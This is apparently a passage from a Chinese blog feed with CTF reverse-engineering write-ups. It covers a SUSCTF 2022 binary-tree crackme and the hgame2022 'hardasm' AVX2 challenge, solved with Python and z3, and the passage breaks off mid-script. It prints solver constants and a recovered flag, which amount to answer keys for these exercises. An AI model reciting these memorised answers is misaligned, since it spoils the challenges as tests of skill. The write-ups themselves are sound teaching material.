class="number">25</span>, <span class="number">24</span>, <span class="number">29</span>], [<span class="string">'V'</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">2</span>], [<span class="string">'W'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'X'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'Y'</span>, <span class="number">2</span>, <span class="number">27</span>, <span class="number">27</span>], [<span class="string">'Z'</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">2</span>], [<span class="string">'2'</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">9</span>], [<span class="string">'3'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'4'</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">3</span>], [<span class="string">'5'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="string">'6'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="string">'7'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br></pre></td></tr></table></figure><p>再通过看汇编与调试分析出在check时，如果每组的第一个4字节变量与第二个4字节变量不为0，那么他和输入有如下关系：</p><blockquote><p>如果是第一个4字节变量不为0：input[i]+23*i == b[i]</p><p>如果是第二个4字节变量不为0：input[i]+23*i == c[i]</p><p>另外每次还要check每组的第三个4字节变量是否等于a[i]</p></blockquote><p>以上的a，b，c分别对应程序中如下的三个硬编码密文表：<br><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/wgFMS7AKGVeJ2pR.png" alt="image-20220228180145280"></p><p>再通过调试dword_1400073C0的填充与最后check过程，能得出这是一个树的构造过程（又根据提示确定是二叉树），那么我们上面看到的每组28个字节的数据应该就是一个节点，且每组的第一个4字节变量与第二个4字节变量分别指向的它的左子树和右子树的位置，下标从1开始，0表示空，这也正好对应dword_1400073C0数组的第一个28字节单元为0。</p><p>为了知道这个二叉树的构成，我输入测试数据 ABCDEFGHIJKLMNOPQRSTUVWXYZ234567 ，然后根据dword_1400073C0数组数据画出生成的二叉树，但完全不符合二叉搜索树的构造，，后面好久才反应过来这个二叉树并不是将输入的ascii值作为权重值，而是将输入经过运算后的值，这个值就对应每组28字节数据中的第三个4字节数据，这样也就正好符合我画出的二叉树了。</p><p>接着跟踪输入的运算，得出对对输入的运算就是一个加法值，而这个加法的值生成是将 19600416 作为初始化数据，然后一些乘法、模除、加法运算。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/SUOMQngZe9m7R3B.png" alt="image-20220228195930604"></p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/kR4J7BXG5ofcgZe.png" alt="image-20220228200021101"></p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/Q5VAy6gBdPT7LEx.png" alt="image-20220228200039151"></p><p>写成python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = []</span><br><span class="line">sum = <span class="number">19600416</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    sum = sum*<span class="number">48271</span>%<span class="number">0x000000007FFFFFFF</span></span><br><span class="line">    x += [sum%<span class="number">107</span>+<span class="number">0x61</span>+i]</span><br></pre></td></tr></table></figure><p>再接着就是根据我画出的二叉数看汇编与调试check过程，得出是后序遍历取数据进行对比的，那么我们就可以根据密文数组a（上面提到的）画出还原的二叉树，因为这个是二叉搜索树，所以根据后序遍历是能唯一确定一棵二叉树的。</p><p>还原出二叉数后，接着就是还原出他们的下标了，先从要判断的前三个叶子节点开始用他们之间的满足的关系爆破出开始的正确下标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0</span>, <span class="number">0x00000000000000A8</span>, <span class="number">0x0000000000000131</span>, <span class="number">0x0000000000000113</span>, <span class="number">0x0000000000000047</span>, <span class="number">0x000000000000009E</span>, <span class="number">0x000000000000003B</span>, <span class="number">0x000000000000003A</span>, <span class="number">0x00000000000000BF</span>, <span class="number">0x0000000000000092</span>, <span class="number">0x00000000000000F0</span>, <span class="number">0x0000000000000174</span>, <span class="number">0x00000000000000C3</span>, <span class="number">0x0000000000000289</span>, <span class="number">0x0000000000000104</span>, <span class="number">0x0000000000000260</span>, <span class="number">0x000000000000004D</span>, <span class="number">0x00000000000002FB</span>, <span class="number">0x000000000000009E</span>, <span class="number">0x0000000000000191</span>, <span class="number">0x0000000000000158</span>, <span class="number">0x000000000000007D</span>, <span class="number">0x000000000000004A</span>, <span class="number">0x00000000000001E9</span>, <span class="number">0x0000000000000101</span>, <span class="number">0x00000000000000D0</span>, <span class="number">0x00000000000000FC</span>, <span class="number">0x0000000000000070</span>, <span class="number">0x000000000000011F</span>, <span class="number">0x0000000000000345</span>, <span class="number">0x0000000000000162</span>, <span class="number">0x00000000000002A4</span>, <span class="number">0x0000000000000092</span>]</span><br><span class="line">b = [<span class="number">0</span>, <span class="number">0x00000000000000AC</span>, <span class="number">0x00000000000000FD</span>, <span class="number">0x0000000000000247</span>, <span class="number">0x0000000000000115</span>, <span class="number">0x00000000000000D4</span>, <span class="number">0x00000000000002B5</span>, <span class="number">0x00000000000001FC</span>, <span class="number">0x000000000000028B</span>, <span class="number">0x000000000000014A</span>, <span class="number">0x000000000000004C</span>, <span class="number">0x000000000000008E</span>, <span class="number">0x00000000000000E9</span>, <span class="number">0x0000000000000055</span>, <span class="number">0x000000000000012C</span>, <span class="number">0x00000000000000F5</span>, <span class="number">0x00000000000000E3</span>, <span class="number">0x0000000000000081</span>, <span class="number">0x00000000000002E2</span>, <span class="number">0x00000000000001A8</span>, <span class="number">0x0000000000000117</span>, <span class="number">0x0000000000000152</span>, <span class="number">0x0000000000000101</span>, <span class="number">0x000000000000003A</span>, <span class="number">0x00000000000001D0</span>, <span class="number">0x00000000000000A8</span>, <span class="number">0x00000000000000CC</span>, <span class="number">0x0000000000000149</span>, <span class="number">0x0000000000000137</span>, <span class="number">0x0000000000000300</span>, <span class="number">0x00000000000001EC</span>, <span class="number">0x0000000000000276</span>, <span class="number">0x0000000000000247</span>]</span><br><span class="line">c = [<span class="number">0</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">157</span>, <span class="number">183</span>, <span class="number">210</span>, <span class="number">203</span>, <span class="number">199</span>, <span class="number">198</span>, <span class="number">176</span>, <span class="number">213</span>, <span class="number">218</span>, <span class="number">227</span>, <span class="number">230</span>, <span class="number">232</span>, <span class="number">233</span>, <span class="number">243</span>, <span class="number">244</span>, <span class="number">239</span>, <span class="number">238</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">255</span>, <span class="number">257</span>, <span class="number">245</span>, <span class="number">265</span>, <span class="number">287</span>, <span class="number">282</span>, <span class="number">326</span>, <span class="number">292</span>, <span class="number">271</span>, <span class="number">262</span>, <span class="number">223</span>]</span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line">sum = <span class="number">19600416</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    sum = sum*<span class="number">48271</span>%<span class="number">0x000000007FFFFFFF</span></span><br><span class="line">    x += [sum%<span class="number">107</span>+<span class="number">0x61</span>+i]</span><br><span class="line">    <span class="comment">#print(sum)</span></span><br><span class="line"></span><br><span class="line">x = [<span class="number">0</span>]+x</span><br><span class="line">print(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    c = [<span class="number">0</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">157</span>, <span class="number">183</span>, <span class="number">210</span>, <span class="number">203</span>, <span class="number">199</span>, <span class="number">198</span>, <span class="number">176</span>, <span class="number">213</span>, <span class="number">218</span>, <span class="number">227</span>, <span class="number">230</span>, <span class="number">232</span>, <span class="number">233</span>, <span class="number">243</span>, <span class="number">244</span>, <span class="number">239</span>, <span class="number">238</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">255</span>, <span class="number">257</span>, <span class="number">245</span>, <span class="number">265</span>, <span class="number">287</span>, <span class="number">282</span>, <span class="number">326</span>, <span class="number">292</span>, <span class="number">271</span>, <span class="number">262</span>, <span class="number">223</span>]</span><br><span class="line">    c[<span class="number">1</span>] -= x[i]</span><br><span class="line">    c[<span class="number">2</span>] = a[<span class="number">2</span>]<span class="number">-23</span>*i</span><br><span class="line">    <span class="keyword">if</span> <span class="number">175</span>-c[<span class="number">2</span>] <span class="keyword">in</span> x:</span><br><span class="line">        j = x.index(<span class="number">175</span>-c[<span class="number">2</span>])</span><br><span class="line">        c[<span class="number">3</span>] = b[<span class="number">3</span>]<span class="number">-23</span>*<span class="number">23</span></span><br><span class="line">        print(i, <span class="number">23</span>)</span><br><span class="line">        print(chr(c[<span class="number">1</span>]), end = <span class="string">''</span>)</span><br><span class="line">        print(chr(c[<span class="number">2</span>]), end = <span class="string">''</span>)</span><br><span class="line">        print(chr(c[<span class="number">3</span>]), end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>上面有一个坑，就是取出的满足数据是123，而123这个数据在x数组中有2个，5和23，使用x.index()只能得到第一个，而满足条件的正好是后面一个，这里卡了好久，，，</p><p>得到第一个下标后，后面的所有的下标就都可以递推出来了。</p><p>部分运算过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">157</span>-x[<span class="number">5</span>]</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">157</span>-x[<span class="number">23</span>]</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">157</span><span class="number">-0x36</span></span><br><span class="line"><span class="number">103</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = [<span class="number">0</span>, <span class="number">193</span>, <span class="number">168</span>, <span class="number">197</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">122</span>, <span class="number">182</span>, <span class="number">187</span>, <span class="number">112</span>, <span class="number">145</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">131</span>, <span class="number">191</span>, <span class="number">204</span>, <span class="number">159</span>, <span class="number">191</span>, <span class="number">154</span>, <span class="number">207</span>, <span class="number">133</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">151</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">228</span>, <span class="number">194</span>, <span class="number">186</span>, <span class="number">183</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x.index(<span class="number">103</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.index(<span class="number">176</span>)</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">9</span>]<span class="number">-4</span>*<span class="number">23</span></span><br><span class="line"><span class="number">54</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">54</span>)</span><br><span class="line"><span class="string">'6'</span></span><br></pre></td></tr></table></figure><p>过程图，手画的，hh，</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/swYl7I35EGdLJTa.png" alt="image-20220228210311728"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">0</span>, <span class="number">249</span>, <span class="number">218</span>, <span class="number">247</span>, <span class="number">157</span>, <span class="number">223</span>, <span class="number">183</span>, <span class="number">230</span>, <span class="number">176</span>, <span class="number">238</span>, <span class="number">287</span>, <span class="number">162</span>, <span class="number">198</span>, <span class="number">265</span>, <span class="number">213</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">255</span>, <span class="number">257</span>, <span class="number">292</span>, <span class="number">203</span>, <span class="number">262</span>, <span class="number">232</span>, <span class="number">175</span>, <span class="number">227</span>, <span class="number">271</span>, <span class="number">199</span>, <span class="number">245</span>, <span class="number">210</span>, <span class="number">326</span>, <span class="number">244</span>, <span class="number">243</span>, <span class="number">282</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">[<span class="number">0</span>, <span class="number">193</span>, <span class="number">168</span>, <span class="number">197</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">122</span>, <span class="number">182</span>, <span class="number">187</span>, <span class="number">112</span>, <span class="number">145</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">131</span>, <span class="number">191</span>, <span class="number">204</span>, <span class="number">159</span>, <span class="number">191</span>, <span class="number">154</span>, <span class="number">207</span>, <span class="number">133</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">151</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">228</span>, <span class="number">194</span>, <span class="number">186</span>, <span class="number">183</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [ans[i]-x[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = flag[<span class="number">1</span>:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.join(map(chr ,flag))</span><br><span class="line"><span class="string">'8226d8a68d25d8f03be17c4d7027b29c'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame2022-hardasm</title>
      <link href="/2022/02/19/hgame2022-hardasm/"/>
      <url>/2022/02/19/hgame2022-hardasm/</url>
      
        <content type="html"><![CDATA[<p>把最后一个题做了一下。<a id="more"></a></p><h3 id="hardasm"><a href="#hardasm" class="headerlink" title="hardasm"></a>hardasm</h3><p>整体上程序就是使用6000多行的某种汇编指令集对输入进行运算后和硬编码的密文进行比较。</p><p>首先将输入将输入赋值给了ymm0（一种256bit的数据类型，32字节），然后ymm1-ymm7都是程序中的硬编码用于加密运算的数据，后面就是加密运算，主要涉及vpermd，vpxor，vpaddb，vpsubb，vpshufb这5个指令。</p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216190712200.png" alt="image-20220216190712200"></p><p>找其中的几个指令搜索一下可以知道这是AVX2指令集。</p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216182940223.png" alt="image-20220216182940223"></p><p>对相关汇编指令的介绍：<a href="https://zhuanlan.zhihu.com/p/424475308" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/424475308</a></p><p>x86 and amd64 instruction reference：<a href="https://www.felixcloutier.com/x86/index.html" target="_blank" rel="noopener">https://www.felixcloutier.com/x86/index.html</a></p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216185755561.png" alt="image-20220216185755561"></p><p>然后通过查<strong>x86 and amd64 instruction reference</strong>来弄清楚程序中涉及加密运算的指令的含义：</p><p>vpermd  ymm4, ymm7, ymm4：使用ymm7的数据作为index来置换ymm4中的数据。</p><p>注意一下它是以4个字节为一组进行的，最后d表示doublewords</p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216185834156.png" alt="image-20220216185834156"></p><p>vpxor   ymm4, ymm4, ymm5：就是普通的异或</p><p>vpaddb  ymm0, ymm0, ymm2：加法，注意它是1个字节为单位进行的，最后b表示byte</p><p>vpsubb  ymm0, ymm0, ymm4：减法，注意它是1个字节为单位进行的，最后b表示byte</p><p>vpshufb ymm3, ymm3, ymm6：使用ymm6的数据来打乱ymm3</p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216190131361.png" alt="image-20220216190131361"></p><p>打乱规则：</p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216190407192.png" alt="image-20220216190407192"></p><p>将这个打乱的规则转化为python代码：<br><img src="/2022/02/19/hgame2022-hardasm/image-20220216190520454.png" alt="image-20220216190520454"></p><p>弄清楚程序的运算逻辑后没想到啥好的逆向技巧，这里是通过把所有的运算复制到文本中，接着使用python来将每条指令转化为一个函数调用且保存到一个py文件，再将每个运算指令都单独写处一个函数，最后使用z3约束求解。</p><p>提取脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'1.txt'</span>, <span class="string">"r"</span>)</span><br><span class="line">data = f.read().split(<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br><span class="line">f1 = open(<span class="string">'ans.py'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    tmp = i.split(<span class="string">' '</span>)</span><br><span class="line">    f1.write(tmp[<span class="number">0</span>]+<span class="string">'('</span>+tmp[<span class="number">2</span>].strip(<span class="string">','</span>)+<span class="string">', '</span>+tmp[<span class="number">3</span>]+<span class="string">')\n'</span>)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>部分z3脚本（省去了中间的部分运算指令）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">ymm0 = [BitVec(<span class="string">'x%d'</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">ymm7 = [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">ymm1 = [<span class="number">0xF0</span>, <span class="number">0xFF</span>, <span class="number">0x64</span>, <span class="number">0x26</span>, <span class="number">0xF2</span>, <span class="number">0x8F</span>, <span class="number">0x40</span>, <span class="number">0xEE</span>, <span class="number">0xEE</span>, <span class="number">0x27</span>, <span class="number">0x07</span>, <span class="number">0xEF</span>, <span class="number">0x88</span>, <span class="number">0x0A</span>, <span class="number">0x21</span>, <span class="number">0x14</span>, <span class="number">0xC3</span>, <span class="number">0xFC</span>, <span class="number">0x70</span>, <span class="number">0xE5</span>, <span class="number">0xA8</span>, <span class="number">0xF3</span>, <span class="number">0xF5</span>, <span class="number">0x1A</span>, <span class="number">0xD4</span>, <span class="number">0x3C</span>, <span class="number">0xB1</span>, <span class="number">0x0C</span>, <span class="number">0xE5</span>, <span class="number">0xBC</span>, <span class="number">0xB9</span>, <span class="number">0x1B</span>]</span><br><span class="line">ymm2 = [<span class="number">0x0D</span>, <span class="number">0xC0</span>, <span class="number">0x84</span>, <span class="number">0xC5</span>, <span class="number">0x0E</span>, <span class="number">0x80</span>, <span class="number">0x50</span>, <span class="number">0xFF</span>, <span class="number">0x28</span>, <span class="number">0x1A</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x1D</span>, <span class="number">0xC1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0x34</span>, <span class="number">0x51</span>, <span class="number">0x9B</span>, <span class="number">0x35</span>, <span class="number">0xBC</span>, <span class="number">0xD5</span>, <span class="number">0xF4</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0x40</span>, <span class="number">0x90</span>, <span class="number">0x07</span>, <span class="number">0x2A</span>, <span class="number">0xC0</span>, <span class="number">0x2D</span>, <span class="number">0x90</span>]</span><br><span class="line">ymm3 = [<span class="number">0x89</span>, <span class="number">0xA1</span>, <span class="number">0x3E</span>, <span class="number">0xC0</span>, <span class="number">0xE5</span>, <span class="number">0x14</span>, <span class="number">0x5F</span>, <span class="number">0xC5</span>, <span class="number">0x5F</span>, <span class="number">0x14</span>, <span class="number">0xB0</span>, <span class="number">0xD0</span>, <span class="number">0x25</span>, <span class="number">0x1F</span>, <span class="number">0xE8</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0x34</span>, <span class="number">0x36</span>, <span class="number">0xC2</span>, <span class="number">0xC7</span>, <span class="number">0xA0</span>, <span class="number">0xB2</span>, <span class="number">0x3C</span>, <span class="number">0x5E</span>, <span class="number">0x7E</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x98</span>, <span class="number">0xE8</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>]</span><br><span class="line">ymm4 = [<span class="number">0x33</span>, <span class="number">0x5F</span>, <span class="number">0x62</span>, <span class="number">0x68</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0xA8</span>, <span class="number">0xFF</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0xA7</span>, <span class="number">0x94</span>, <span class="number">0x9E</span>, <span class="number">0x9A</span>, <span class="number">0x29</span>, <span class="number">0x34</span>, <span class="number">0x27</span>, <span class="number">0x36</span>, <span class="number">0xD6</span>, <span class="number">0x82</span>, <span class="number">0xC2</span>, <span class="number">0x6D</span>, <span class="number">0xE8</span>, <span class="number">0xAA</span>, <span class="number">0x96</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xC0</span>, <span class="number">0x0C</span>, <span class="number">0x37</span>, <span class="number">0x19</span>, <span class="number">0xC9</span>]</span><br><span class="line">ymm5 = [<span class="number">0x8F</span>, <span class="number">0x21</span>, <span class="number">0xA8</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0x33</span>, <span class="number">0xA6</span>, <span class="number">0x87</span>, <span class="number">0x4C</span>, <span class="number">0x4A</span>, <span class="number">0xA1</span>, <span class="number">0x74</span>, <span class="number">0x4B</span>, <span class="number">0xE6</span>, <span class="number">0x55</span>, <span class="number">0x13</span>, <span class="number">0x5B</span>, <span class="number">0x3F</span>, <span class="number">0x1C</span>, <span class="number">0xD7</span>, <span class="number">0xB9</span>, <span class="number">0x9E</span>, <span class="number">0x39</span>, <span class="number">0x60</span>, <span class="number">0x1D</span>, <span class="number">0xC6</span>, <span class="number">0x91</span>, <span class="number">0x8A</span>, <span class="number">0x36</span>, <span class="number">0x8B</span>]</span><br><span class="line">ymm6 = [<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x93</span>, <span class="number">0xCB</span>, <span class="number">0xE7</span>, <span class="number">0x93</span>, <span class="number">0xA9</span>, <span class="number">0x81</span>, <span class="number">0x0D</span>, <span class="number">0xB6</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x9C</span>, <span class="number">0x7F</span>, <span class="number">0xC0</span>, <span class="number">0x4D</span>, <span class="number">0xCD</span>, <span class="number">0xF0</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0x9F</span>, <span class="number">0x22</span>, <span class="number">0x89</span>, <span class="number">0xEF</span>, <span class="number">0x54</span>, <span class="number">0x5D</span>, <span class="number">0xEF</span>, <span class="number">0x00</span>, <span class="number">0x8D</span>, <span class="number">0xFE</span>, <span class="number">0x5E</span>, <span class="number">0x4C</span>, <span class="number">0xD0</span>, <span class="number">0xEC</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpermd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    tmp = b[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        b[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>] = tmp[<span class="number">4</span>*a[i*<span class="number">4</span>]:<span class="number">4</span>*a[i*<span class="number">4</span>]+<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpxor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a[i] ^= b[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpaddb</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a[i] += b[i]</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpsubb</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a[i] -= b[i]</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpshufb</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    tmp = a[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> b[i]&amp;<span class="number">0x80</span>:</span><br><span class="line">            a[i] = <span class="number">0</span></span><br><span 